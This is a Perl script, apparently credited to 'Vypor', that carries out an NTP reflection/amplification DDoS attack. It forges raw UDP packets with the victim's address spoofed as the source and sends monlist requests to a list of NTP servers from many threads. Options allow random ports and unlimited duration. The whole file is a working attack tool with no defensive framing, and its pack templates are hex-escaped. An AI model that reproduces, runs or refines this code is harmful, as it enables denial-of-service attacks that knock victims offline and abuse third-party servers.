use threads;
use Socket;
( $PROG = $0 ) =~ s/^.*[\/\\]//;

#Usage
if ( @ARGV == 0 ) {
    print
"Usage: ./$PROG [IP] [PORT] [TIME] [LIST] [THREADS]\nMade by Vypor\nUse -1 for random ports, and -1 for unlimited time\nDigitalgangsters.org\n";
    exit;
}

#Random ports ( scroll down to the repeat function to find the function for this)
my $udp_src_port = $ARGV[1];
if ( $udp_src_port =~ "-1" ) {
    print "[+] Flooding Random Ports\n";
}

#Our varibles :D
my $num_of_threads = $ARGV[2];
my $target         = $ARGV[0];
my $udp_src_port   = $ARGV[1];
my $time           = $ARGV[4];

#Open Input List.
my $openme = $ARGV[3];
open my $handle, '<', $openme;
chomp( my @servers = <$handle> );
close $handle;
my $ppr     = '4';
my @threads = initThreads();

#Unlimited time
if ( $time =~ "-1" ) {
    print "[+] Unlimited Seconds\n";
}
print "[+] Flood on $target started\n";

#Does the list exist?
if ( -e $openme ) {
}
unless ( -e $openme ) {
    print "List does not exist.\n";
    exit();
}

#Start Threading
foreach (@threads) {
    $_ = threads->create( \&attackshit );
}
foreach (@threads) {
    $_->join();
}

sub initThreads {
    my @initThreads;
    for ( my $i = 1 ; $i <= $num_of_threads ; $i++ ) {
        push( @initThreads, $i );
    }
    return @initThreads;
}

#Start DDosing.
sub attackshit {

    alarm("$time");
  repeat: my $ip_dst =
      ( gethostbyname( $servers[ int( rand(@servers) ) ] ) )[4];
    my $ip_src = ( gethostbyname($target) )[4];
    socket( RAW, AF_INET, SOCK_RAW, 255 ) or die $!;
    setsockopt( RAW, 0, 1, 1 );

    #Heres the random port shit if you were looking for it
    my $udp_src_port = $ARGV[1];
    if ( $udp_src_port =~ "-1" ) {
        $udp_src_port = $port ? $port : int( rand(65500) ) + 1;
    }
    else {
        my $udp_src_port = $ARGV[1];
    }

    main();

    #main packet formation
    sub main {

        my $packet;
        $packet = ip_header();
        $packet .= udp_header();
        $packet .= payload();
        for ( 1 .. $ppr ) {
            send_packet($packet) or last;
        }
        goto repeat;
    }

    sub ip_header {
        my $ip_ver        = 4;
        my $ip_header_len = 5;
        my $ip_tos        = 0;
        my $ip_total_len  = $ip_header_len + 20;
        my $ip_frag_id    = 0;
        my $ip_frag_flag  = "\x30\x31\x30";
        my $ip_frag_offset =
          "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30";
        my $ip_ttl      = 255;
        my $ip_proto    = 17;
        my $ip_checksum = 0;
        my $ip_header   = pack(
"\x48\x32\x20\x48\x32\x20\x6E\x20\x6E\x20\x42\x31\x36\x20\x68\x32\x20\x63\x20\x6E\x20\x61\x34\x20\x61\x34",
            $ip_ver . $ip_header_len,        $ip_tos,
            $ip_total_len,                   $ip_frag_id,
            $ip_frag_flag . $ip_frag_offset, $ip_ttl,
            $ip_proto,                       $ip_checksum,
            $ip_src,                         $ip_dst
        );
        return $ip_header;
    }

    sub udp_header {
        my $udp_dst_port = 123;
        my $udp_len      = 8 + length( payload() );
        my $udp_checksum = 0;
        my $udp_header   = pack( "\x6E\x20\x6E\x20\x6E\x20\x6E",
            $udp_src_port, $udp_dst_port, $udp_len, $udp_checksum );
        return $udp_header;
    }

    #Payload, edit this if you like ;)
    sub payload {
        my $data = "\x17\x00\x03\x2a" . "\x00" x 4;
        my $payload = pack( "\x61" . length($data), $data );
        return $payload;
    }

    sub send_packet {
        send( RAW, $_[0], 0,
            pack( "\x53\x6E\x61\x34\x78\x38", AF_INET, 60, $ip_dst ) );
    }

}
